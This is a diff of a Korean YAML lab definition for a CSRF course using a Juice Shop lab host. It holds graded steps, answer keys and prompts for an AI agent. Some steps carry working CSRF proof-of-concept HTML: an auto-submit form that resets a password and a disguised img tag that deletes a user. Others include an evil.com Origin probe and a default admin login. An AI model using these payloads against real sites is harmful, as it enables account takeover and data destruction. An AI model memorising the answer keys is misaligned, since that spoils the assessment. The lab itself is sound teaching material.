@@ -3,29 +3,58 @@ title: CSRF(Cross-Site Request Forgery) 실습 (AI 지원)
 version: ai
 course: web-vuln-ai
 week: 4
-description: CSRF 공격의 원리와 토큰 기반 방어 메커니즘을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: |
+  CSRF (Cross-Site Request Forgery) 의 원리·PoC·방어를 Juice Shop (http://juice.6v6.lab) 환경에서
+  학습한다. Juice Shop 은 Angular SPA + JWT-in-Header 인증 모델 — 전통적 CSRF (Cookie 자동
+  첨부) 가 자동발동 불가능한 modern stack 이라는 사실 자체가 핵심 학습 결과. 이를 통해
+  Cookie + Session 기반 legacy 시스템 의 CSRF 위협 모델과 modern SPA + JWT 의 차이를
+  명확히 구분한다. 16 step 모두 attacker 컨테이너 (curl/wget/python) 에서 실행하며 stdout
+  을 직접 quote 해야 채점 통과.
 difficulty: medium
 duration_minutes: 120
 objectives:
-- CSRF 공격 원리를 이해한다
-- CSRF 토큰 검증 메커니즘을 분석한다
-- SameSite 쿠키와 방어 기법을 학습한다
+- CSRF 의 원리 (피해자 브라우저 + 자동 cookie 첨부) 와 자동발동 조건을 이해한다
+- Juice Shop 의 JWT-Header 인증이 왜 CSRF 면역인지 분석한다 (학습 핵심)
+- CSRF 토큰 / SameSite / Referer / CORS 4 계층 방어를 비교한다
+- legacy Cookie 기반 시스템 의 CSRF PoC (auto-submit form, img src, fetch credentials) 작성
+- 인증방식 × CSRF 방어 매트릭스로 시스템 별 권고를 도출한다
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: '대상 애플리케이션(http://{{WEB_IP}})의 폼에서 CSRF 토큰 존재 여부를 확인하시오.
+  instruction: |
+    [목표] Juice Shop (http://juice.6v6.lab) 의 메인 HTML 응답에서 CSRF 토큰 (hidden input,
+    meta tag, JS 변수) 존재 여부를 확인한다.
 
+    [배경] CSRF 토큰은 *Cookie + Session* 인증을 쓰는 SSR (Django/Rails/Spring MVC) 에서
+    필수다. 서버가 form 응답에 `<input type="hidden" name="csrf_token" value="...">` 을
+    심어, 다음 POST 에서 token 일치 확인. 외부 사이트는 token 을 알 수 없으니 위조 차단.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_detect` 에 적합한 도구: curl -i 로 CSRF 토큰 확인.
-    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: HTML 소스에서 hidden input을 찾으세요.
+    [실행]
+      curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10
+
+    [예상 결과] 빈 출력 (또는 Angular framework 의 hidden input 일부 만). 즉 **CSRF 토큰
+    없음**. Juice Shop = Angular SPA + JWT-Header 인증이라 cookie 가 자동 첨부되지 않는다 →
+    CSRF 가 자동발동 불가능 → 토큰 자체가 불필요한 *modern* 패턴.
+
+    [도구] **curl 단독 의존 금지** — wget / nikto -Tuning x / python BeautifulSoup 도 가능.
+    호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.
+  hint: |
+    grep 결과가 비어 있으면 "CSRF 토큰 없음" 이 정상. 그것이 곧 Juice Shop = JWT-Header
+    의 증거. Cookie 인증 시스템 (DVWA, WordPress 등) 의 form 과 비교해 보면 차이가 명확.
   category: csrf_detect
   points: 8
-  answer: '🤖 프롬프트: 대상 애플리케이션(http://10.20.32.80)의 폼에서 CSRF 토큰 존재 여부를 확인해줘
+  answer: |
+    🤖 프롬프트: Juice Shop (http://juice.6v6.lab) 의 메인 페이지에 CSRF 토큰 hidden input
+    이 있는지 확인하고, 결과로부터 인증 모델 (Cookie+Session vs JWT-Header) 을 추정해줘.
 
-    📎 참고 (CLI): curl -s http://10.20.32.80 | grep -i ''csrf\|_token\|hidden'' | head
-    -10 && echo ''CSRF 토큰 확인 완료'''
-  answer_detail: CSRF 토큰이 없으면 외부 사이트에서 요청을 위조할 수 있습니다.
+    📎 참고 (CLI):
+      curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10 \
+        && echo 'CSRF 토큰 확인 완료'
+  answer_detail: |
+    Juice Shop = Angular SPA + JWT-Header 인증. CSRF 토큰 hidden input 이 없는 것이 정상
+    이며 modern SPA 의 표준 패턴이다. 반면 Django form, Spring MVC, Rails ERB 같은 SSR +
+    Session Cookie 시스템은 csrf_token 필수. 이 step 의 빈 출력은 "취약" 이 아니라 "다른
+    위협 모델" 의 증거임을 학습한다.
   verify:
     type: output_contains
     expect:
@@ -33,115 +62,234 @@ steps:
     - http_request
     field: stdout
     semantic:
-      intent: CSRF 토큰 존재 여부 확인 — 폼 HTML 에서 hidden input 또는 meta CSRF 토큰 검증
+      intent: |
+        Juice Shop HTML 응답에서 CSRF 토큰 (hidden input / meta / JS) 존재 여부 확인. 빈
+        결과 = Angular SPA + JWT-Header 인증의 정상 결과 — 학습 핵심.
       success_criteria:
-      - curl 로 폼 페이지 가져와 hidden input name csrf 또는 _token 검색
-      - 토큰 유무 판단 근거 제시
-      - 토큰 없을 때 CSRF 가능성 명시
+      - curl 로 메인 페이지 가져와 csrf|_token|hidden grep 실행
+      - 출력 결과 (빈 출력 또는 일부 Angular hidden input) 의 의미 해석
+      - Juice Shop = JWT-Header 라 CSRF 토큰 불필요 사실 명시
+      - SSR + Session Cookie 시스템 (Django/Rails) 과의 차이 언급
       acceptable_methods:
-      - curl <url> | grep -iE csrf_token|authenticity_token
-      - Burp Proxy 로 폼 분석
-      - browser dev tools 로 DOM 검사
-      - nikto 로 자동 탐지
+      - curl <url> | grep -iE 'csrf|_token|hidden'
+      - wget -qO- + grep
+      - python BeautifulSoup 로 input 분석
+      - browser dev tools DOM 검사
       negative_signs:
-      - 폼 수집 없이 개념만
-      - 토큰 검색 결과 없음
-      - 위험 판정 없음
+      - 빈 결과를 "취약" 으로 오판 (실제는 다른 위협 모델)
+      - 인증 모델 (JWT vs Cookie) 추정 누락
+      - SSR 시스템과의 차이 설명 없음
   target_vm: attacker
-  script: curl -s http://10.20.32.80 | grep -i 'csrf\|_token\|hidden' | head -10 &&
+  script: |
+    curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10
     echo 'CSRF 토큰 확인 완료'
   risk_level: low
-  bastion_prompt: '대상 애플리케이션(http://10.20.32.80)의 폼에서 CSRF 토큰 존재 여부를 확인해줘
+  bastion_prompt: |
+    Juice Shop (http://juice.6v6.lab) 의 메인 페이지에 CSRF 토큰 hidden input 이 있는지
+    확인하고, 결과로부터 인증 모델 (Cookie+Session vs JWT-Header) 을 추정해줘.
 
+    실행: curl -s http://juice.6v6.lab | grep -iE 'csrf|_token|hidden' | head -10
 
-    [도구 권장] csrf_detect: curl -i 로 CSRF 토큰 확인. curl 만 쓰지 말고 **curl -i 로 CSRF 토큰 확인**
-    등 적합 도구로 호출 후 stdout quote.'
+    빈 결과가 정상 (Angular SPA + JWT-Header). 출력 1-3줄 ``` 블록으로 quote 한 뒤,
+    Juice Shop 의 인증 모델 추정과 그 근거 명시. 마지막에 'CSRF 토큰 확인 완료' echo.
 - order: 2
-  instruction: 'CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.
+  instruction: |
+    [목표] 가상의 Cookie + Session 사이트 의 패스워드 변경 endpoint 를 위조하는 CSRF PoC
+    HTML 페이지를 작성한다 (legacy 시나리오 시연).
 
+    [배경] 전형적 CSRF = 피해자가 *이미 로그인된* 사이트의 cookie 가 자동 첨부되는 점을 악용.
+    공격자 페이지가 hidden form 을 자동 submit → 피해자의 cookie 가 함께 전송되어 서버는
+    정상 요청으로 인식.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_craft` 에 적합한 도구: curl + cookie jar (-b -c),
-    HTML form 작성. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: auto-submit 폼을 작성하세요.
+    [Juice Shop 적용성] Juice Shop 자체는 JWT-Header 라 PoC 가 *작동 안 함* — 그러나 PoC
+    의 *구조* 자체는 Cookie 기반 시스템 (DVWA, WordPress wp-admin, 기업 내 form-based
+    web) 에 그대로 적용 가능. 작동 여부 확인 보다 *PoC 구조 이해* 가 목표.
+
+    [실행]
+      cat > /tmp/csrf_poc.html <<'HTML'
+      <html><body onload="document.forms[0].submit()">
+        <form action="http://juice.6v6.lab/profile" method="POST">
+          <input type="hidden" name="password" value="hacked123">
+        </form>
+      </body></html>
+      HTML
+      head -c 200 /tmp/csrf_poc.html && echo
+      echo 'CSRF PoC 작성 완료'
+
+    [도구 권장] curl + cookie jar (-b -c), HTML form 작성, browser 로 PoC 페이지 직접 로드
+    가능. 호출 후 **stdout 1~3줄을 ``` 블록으로 직접 quote**.
+  hint: |
+    onload 자동 submit + hidden input 으로 새 비밀번호 지정 + form action 에 대상 URL.
+    legacy Cookie 시스템 가정. Juice Shop 의 JWT-Header 에서는 안 작동.
   category: csrf_craft
   points: 10
-  answer: '🤖 프롬프트: CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조 구현 방법과 예시를 설명해줘
+  answer: |
+    🤖 프롬프트: 가상 Cookie 기반 사이트 (예: WordPress) 의 패스워드 변경 endpoint 를 위조
+    하는 auto-submit CSRF PoC HTML 을 /tmp/csrf_poc.html 로 작성하고, Juice Shop 에서는
+    왜 작동하지 않는지 설명해줘.
 
-    📎 참고 (CLI): echo ''<html><body onload="document.forms[0].submit()"><form action="http://10.20.32.80/profile"
-    method="POST"><input name="password" value="hacked"></form></body></html>'' &&
-    echo ''CSRF PoC 작성 완료'''
-  answer_detail: 자동 제출 폼으로 사용자가 페이지를 방문하면 즉시 요청이 전송됩니다.
+    📎 참고 (CLI):
+      cat > /tmp/csrf_poc.html <<'HTML'
+      <html><body onload="document.forms[0].submit()">
+        <form action="http://juice.6v6.lab/profile" method="POST">
+          <input type="hidden" name="password" value="hacked123">
+        </form>
+      </body></html>
+      HTML
+      head -c 200 /tmp/csrf_poc.html && echo
+      echo 'CSRF PoC 작성 완료'
+  answer_detail: |
+    auto-submit form 은 피해자가 페이지를 *열기만 하면* 즉시 POST 가 발생하는 핵심 CSRF
+    벡터. 단 이 공격은 (1) 피해자가 *대상 사이트에 로그인 중* + (2) 인증이 *cookie + SameSite
+    완화* + (3) form action 의 endpoint 가 *Origin/Referer 검증 없음* — 3 조건이 모두 성립
+    해야 작동. Juice Shop 은 (1) 만 있고 (2)(3) 가 차단 — JWT-Header 인증이라 cookie 자동
+    첨부 자체가 없다.
   verify:
     type: output_contains
     expect: CSRF PoC 작성 완료
     field: stdout
     semantic:
-      intent: CSRF 공격 HTML 페이지 — 패스워드 변경 POST 를 자동 제출하는 hidden form
+      intent: |
+        auto-submit CSRF PoC HTML 작성 — form action + hidden input + body onload submit.
+        Legacy Cookie 시스템 가정. Juice Shop 의 JWT-Header 에선 작동 안 함 사실 명시.
       success_criteria:
-      - form action 에 대상 URL + POST 메서드
-      - hidden input 으로 새 비밀번호 지정
-      - body onload 자동 submit 또는 iframe src 로 자동 실행
+      - /tmp/csrf_poc.html 파일 생성 + head 출력 quote
+      - form action 에 대상 URL + method=POST 포함
+      - hidden input 으로 변경할 값 (new password) 지정
+      - body onload 자동 submit 또는 iframe src 자동 실행 메커니즘 명시
+      - Juice Shop 의 JWT-Header 에서 작동 안 하는 이유 (cookie 자동첨부 부재) 한 줄 명시
       acceptable_methods:
       - HTML form body onload submit
       - iframe srcdoc 로 내장
-      - JavaScript fetch POST
+      - JavaScript fetch POST + credentials include
       - BeEF module 활용
       negative_signs:
       - form action URL 누락
-      - 자동 submit 미설정
-      - 공격 시나리오 흐름 설명 없음
+      - 자동 submit 미설정 (사용자 클릭 필요)
+      - JWT-Header 에서 안 작동 한다는 사실 누락
+      - PoC 작동 전제 (cookie+session) 조건 분석 없음
   target_vm: attacker
-  script: echo '<html><body onload="document.forms[0].submit()"><form action="http://10.20.32.80/profile"
-    method="POST"><input name="password" value="hacked"></form></body></html>' &&
+  script: |
+    cat > /tmp/csrf_poc.html <<'HTML'
+    <html><body onload="document.forms[0].submit()">
+      <form action="http://juice.6v6.lab/profile" method="POST">
+        <input type="hidden" name="password" value="hacked123">
+      </form>
+    </body></html>
+    HTML
+    head -c 200 /tmp/csrf_poc.html && echo
     echo 'CSRF PoC 작성 완료'
   risk_level: low
-  bastion_prompt: 'CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.
+  bastion_prompt: |
+    Legacy Cookie 기반 시스템 가정한 패스워드 변경 위조 auto-submit CSRF PoC HTML 을
+    /tmp/csrf_poc.html 로 작성. 다음 헤레닥 명령 실행 후 head 결과 quote:
 
+      cat > /tmp/csrf_poc.html <<'HTML'
+      <html><body onload="document.forms[0].submit()">
+        <form action="http://juice.6v6.lab/profile" method="POST">
+          <input type="hidden" name="password" value="hacked123">
+        </form>
+      </body></html>
+      HTML
+      head -c 200 /tmp/csrf_poc.html && echo
+      echo 'CSRF PoC 작성 완료'
 
-    [도구 권장] csrf_craft: curl + cookie jar (-b -c), HTML form 작성. curl 만 쓰지 말고 **curl
-    + cookie jar (-b -c)** 등 적합 도구로 호출 후 stdout quote.'
+    마지막에 Juice Shop 의 JWT-Header 에서는 왜 작동 안 하는지 한 문장 설명.
 - order: 3
-  instruction: '이미지 태그를 이용한 GET 기반 CSRF를 구성하시오.
+  instruction: |
+    [목표] `<img src>` 태그를 이용한 GET 기반 CSRF PoC 를 작성하고, RESTful 원칙 위반과의
+    관계를 분석한다.
 
+    [배경] 브라우저는 `<img src="...">` 의 URL 을 자동 GET 한다. 만약 서버가 GET 메서드로
+    *상태 변경* (계정 삭제, 송금 등) 을 허용한다면, 단순한 이미지 태그만으로 피해자 cookie
+    가 자동 첨부된 GET 요청이 발생 → CSRF 성립.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_craft` 에 적합한 도구: curl + cookie jar (-b -c),
-    HTML form 작성. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: img src에 상태 변경 URL을 삽입하세요.
+    [근본 원인] RFC 7231 §4.2.1: GET 은 *safe* (서버 상태 변경 금지). 이 원칙을 위반한 API
+    설계 (예: `/api/users/1/delete` GET) 가 곧 CSRF 공격면.
+
+    [실행]
+      cat > /tmp/csrf_get.html <<'HTML'
+      <html><body>
+        <h1>Cute kitten gallery</h1>
+        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
+      </body></html>
+      HTML
+      head -c 300 /tmp/csrf_get.html && echo
+      echo 'GET CSRF PoC 작성 완료'
+
+    [도구 권장] curl + cookie jar, HTML form 작성, browser 로 페이지 로드. 호출 후
+    **stdout 1~3줄 ``` 블록 quote**.
+  hint: |
+    img src 에 상태 변경 URL 삽입. RESTful 원칙 (GET = safe) 위반 분석 포함. 다른 벡터:
+    `<link rel=prefetch>`, `<script src>`, CSS `background-image: url(...)`.
   category: csrf_craft
   points: 10
-  answer: '🤖 프롬프트: 이미지 태그를 이용한 GET 기반 CSRF를 구성해줘
+  answer: |
+    🤖 프롬프트: img 태그를 이용한 GET 기반 CSRF PoC HTML 을 /tmp/csrf_get.html 로 작성
+    하고, GET 메서드로 상태 변경을 허용한 설계가 왜 위험한지 RFC 7231 관점에서 설명해줘.
 
-    📎 참고 (CLI): echo ''<img src="http://10.20.32.80/api/users/1/delete" style="display:none">''
-    && echo ''GET CSRF PoC 작성 완료'''
-  answer_detail: GET 요청으로 상태 변경이 가능하면 img 태그만으로 CSRF가 가능합니다.
+    📎 참고 (CLI):
+      cat > /tmp/csrf_get.html <<'HTML'
+      <html><body>
+        <h1>Cute kitten gallery</h1>
+        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
+      </body></html>
+      HTML
+      head -c 300 /tmp/csrf_get.html && echo
+      echo 'GET CSRF PoC 작성 완료'
+  answer_detail: |
+    GET = safe method (RFC 7231) — 상태 변경 금지가 원칙. 위반 시 (1) img 태그 한 줄로
+    CSRF 가능 (2) 브라우저 history / 프록시 / 로그에 민감 작업 노출 (3) prefetch / link
+    rel 등 다양한 자동 GET 벡터에 노출. 대응: 상태 변경은 항상 POST/PUT/DELETE + CSRF
+    토큰 + Origin 검증.
   verify:
     type: output_contains
     expect: GET CSRF PoC 작성 완료
     field: stdout
     semantic:
-      intent: GET 기반 CSRF — img src 에 상태 변경 URL 넣어 이미지 로드만으로 요청 발생
+      intent: |
+        GET 기반 CSRF PoC — img src 에 상태 변경 URL. 페이지 로드만으로 자동 GET 발생.
+        RFC 7231 GET-safe 원칙 위반과의 관계 분석.
       success_criteria:
-      - img src 에 GET 변경 URL (예 /transfer?to=atk&amp;amt=1000) 포함
-      - 피해자 페이지 방문만으로 요청 발생 메커니즘 설명
-      - GET 에 상태 변경을 두면 안되는 원칙 언급
+      - /tmp/csrf_get.html 생성 + head 출력 quote
+      - img src 에 GET 상태변경 URL (예 /api/Users/1?_method=DELETE) 포함
+      - 페이지 방문만으로 요청 발생 메커니즘 설명
+      - RFC 7231 GET=safe 원칙과 위반 시 위험성 명시
       acceptable_methods:
       - img src <target url>
-      - link rel prefetch
+      - link rel=prefetch
       - iframe src
-      - CSS background-image url
+      - CSS background-image:url(...)
+      - script src
       negative_signs:
-      - POST 로 오해
-      - CSRF 원리 설명 없음
-      - RESTful 원칙 언급 없음
+      - POST 메서드로 오해
+      - GET-safe 원칙 언급 없음
+      - 자동 GET 벡터 단일 (img 만)
   target_vm: attacker
-  script: echo '<img src="http://10.20.32.80/api/users/1/delete" style="display:none">'
-    && echo 'GET CSRF PoC 작성 완료'
+  script: |
+    cat > /tmp/csrf_get.html <<'HTML'
+    <html><body>
+      <h1>Cute kitten gallery</h1>
+      <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
+    </body></html>
+    HTML
+    head -c 300 /tmp/csrf_get.html && echo
+    echo 'GET CSRF PoC 작성 완료'
   risk_level: low
-  bastion_prompt: '이미지 태그를 이용한 GET 기반 CSRF를 구성해줘
+  bastion_prompt: |
+    GET 기반 CSRF PoC HTML 을 /tmp/csrf_get.html 로 작성. 다음 헤레닥 실행 후 head 출력
+    quote:
 
+      cat > /tmp/csrf_get.html <<'HTML'
+      <html><body>
+        <h1>Cute kitten gallery</h1>
+        <img src="http://juice.6v6.lab/api/Users/1?_method=DELETE" width="1" height="1">
+      </body></html>
+      HTML
+      head -c 300 /tmp/csrf_get.html && echo
+      echo 'GET CSRF PoC 작성 완료'
 
-    [도구 권장] csrf_craft: curl + cookie jar (-b -c), HTML form 작성. curl 만 쓰지 말고 **curl
-    + cookie jar (-b -c)** 등 적합 도구로 호출 후 stdout quote.'
+    마지막에 RFC 7231 GET-safe 원칙과 위반 시 위험성 한 문장 설명.
 - order: 4
   instruction: 'AJAX 기반 CSRF를 작성하시오: fetch API 활용.
 
@@ -196,7 +344,7 @@ steps:
   points: 10
   answer: '🤖 프롬프트: SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘
 
-    📎 참고 (CLI): curl -sI http://10.20.32.80 | grep -i ''set-cookie'' && echo ''SameSite
+    📎 참고 (CLI): curl -sI http://juice.6v6.lab | grep -i ''set-cookie'' && echo ''SameSite
     분석 완료'''
   answer_detail: SameSite=Strict는 모든 크로스사이트 요청에서 쿠키 전송을 차단합니다.
   verify:
@@ -219,7 +367,7 @@ steps:
       - 기본값 변경 언급 없음
       - None Secure 필수성 누락
   target_vm: attacker
-  script: curl -sI http://10.20.32.80 | grep -i 'set-cookie' && echo 'SameSite 분석
+  script: curl -sI http://juice.6v6.lab | grep -i 'set-cookie' && echo 'SameSite 분석
     완료'
   risk_level: low
   bastion_prompt: 'SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘
@@ -323,7 +471,7 @@ steps:
   category: csrf_advanced
   points: 10
   answer: "\U0001F916 프롬프트: JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘\n\U0001F4CE 참고 (CLI): curl\
-    \ -s -X POST http://10.20.32.80/api/test \\\n  -H 'Content-Type: text/plain' \\\
+    \ -s -X POST http://juice.6v6.lab/api/test \\\n  -H 'Content-Type: text/plain' \\\
     \n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
   answer_detail: 서버가 Content-Type을 검증하지 않으면 text/plain으로 JSON 데이터를 전송할 수 있습니다.
   verify:
@@ -347,7 +495,7 @@ steps:
       - JSON 만으로 CSRF 완전 차단된다고 오판
       - CORS 연계 없음
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/api/test \\\n  -H 'Content-Type: text/plain'\
+  script: "curl -s -X POST http://juice.6v6.lab/api/test \\\n  -H 'Content-Type: text/plain'\
     \ \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
   risk_level: low
   bastion_prompt: 'JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘
@@ -365,7 +513,7 @@ steps:
   category: csrf_advanced
   points: 10
   answer: "\U0001F916 프롬프트: CORS 설정과 CSRF의 관계를 분석해줘\n\U0001F4CE 참고 (CLI): curl -sI\
-    \ \\\n  -H 'Origin: http://evil.com' http://10.20.32.80 \\\n | grep -i 'access-control'\
+    \ \\\n  -H 'Origin: http://evil.com' http://juice.6v6.lab \\\n | grep -i 'access-control'\
     \ && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
   answer_detail: CORS 와일드카드(*)는 credentials와 함께 사용 불가하지만 특정 Origin 반사는 위험합니다.
   verify:
@@ -392,7 +540,7 @@ steps:
       - credentials 규칙 설명 없음
       - Origin 반사 위험 누락
   target_vm: attacker
-  script: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.32.80 \\\n | grep\
+  script: "curl -sI \\\n  -H 'Origin: http://evil.com' http://juice.6v6.lab \\\n | grep\
     \ -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
   risk_level: low
   bastion_prompt: 'CORS 설정과 CSRF의 관계를 분석해줘
@@ -624,7 +772,7 @@ steps:
   points: 8
   answer: '🤖 프롬프트: CSRF 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.32.80'' &&
+    📎 참고 (CLI): echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://juice.6v6.lab'' &&
     echo ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite''
     && echo ''=== 보고서 완료 ==='''
   answer_detail: CSRF 보고서는 PoC와 재현 절차를 반드시 포함해야 합니다.
@@ -652,7 +800,7 @@ steps:
       - PoC 없음
       - 파일 저장 없음
   target_vm: attacker
-  script: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.32.80'' && echo
+  script: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://juice.6v6.lab'' && echo
     ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite'' &&
     echo ''=== 보고서 완료 ==='''
   risk_level: low
@@ -691,7 +839,7 @@ steps:
 
     `curl -s -i -X POST -H "Content-Type: application/json"
 
-    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://10.20.32.80/rest/user/login`
+    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://juice.6v6.lab/rest/user/login`
 
     실행. 응답에서 `authentication.token` (JWT) 추출. JWT 3-part (header.payload.signature)
     구조 + base64
@@ -737,14 +885,14 @@ steps:
   bastion_prompt: '[복합 시나리오 — w04 인증 × CSRF 매트릭스]
 
 
-    JuiceShop (http://10.20.32.80) 인증 토큰 분석 → CSRF PoC → 매트릭스 보고서 3 phase.
+    JuiceShop (http://juice.6v6.lab) 인증 토큰 분석 → CSRF PoC → 매트릭스 보고서 3 phase.
 
 
     Phase A (JWT 분석):
 
     `curl -s -i -X POST -H "Content-Type: application/json" -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
 
-    http://10.20.32.80/rest/user/login` 실행. 응답 body 에서 JWT 추출.
+    http://juice.6v6.lab/rest/user/login` 실행. 응답 body 에서 JWT 추출.
 
     `echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null` 로 payload decode. alg/iat/exp
     출력.
